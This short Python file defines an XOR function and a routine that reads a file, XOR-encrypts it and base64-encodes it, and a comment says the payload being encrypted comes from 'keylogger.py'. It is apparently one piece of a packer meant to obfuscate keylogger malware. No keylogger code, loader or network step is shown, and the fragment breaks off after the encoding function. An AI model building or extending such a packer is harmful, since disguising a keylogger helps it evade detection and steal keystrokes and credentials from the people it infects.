import base64
import random

# XOR encryption function
def xor_encrypt(data, key):
    return ''.join(chr(ord(c) ^ key) for c in data)

# Encrypt the payload from keylogger.py
def encrypt_payload(file_path, key):
    with open(file_path, "r") as f:
        code = f.read()
    encrypted = xor_encrypt(code, key)
    return base64.b64encode(encrypted.encode()).decode()

